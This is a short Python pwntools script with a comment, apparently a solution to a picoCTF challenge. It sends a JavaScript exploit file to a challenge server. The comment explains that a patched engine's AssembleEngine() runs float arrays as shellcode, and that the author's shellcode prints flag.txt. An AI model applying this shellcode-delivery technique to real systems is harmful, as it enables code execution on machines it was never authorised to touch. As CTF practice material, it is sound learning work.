from pwn import *
import struct

f = open('vuln.js', 'rb')
data = f.read()
f.close()

p = remote('mercury.picoctf.net', 51835)

## Read until the prompt
p.readuntil(':')

print('Sending size: %d' %(len(data)))

## Send the file size
p.send(str(len(data)) + '\n')

p.readline()
p.send(data + b'\n')

p.interactive()

'''
This is just the node.js java interpreter with some extra functionality which you can find in the patch.

If you pass an array of floats to AssembleEngine() it will execute it as shellcode. Making shellcode into floats is a
slight pain but nothing too difficult. You also can't just go interactive since there isn't a back and forth so my
shellcode just opens and prints 'flag.txt'.

I wrote a c program to convert shellcode to floats.

Just be wary of NaNs


'''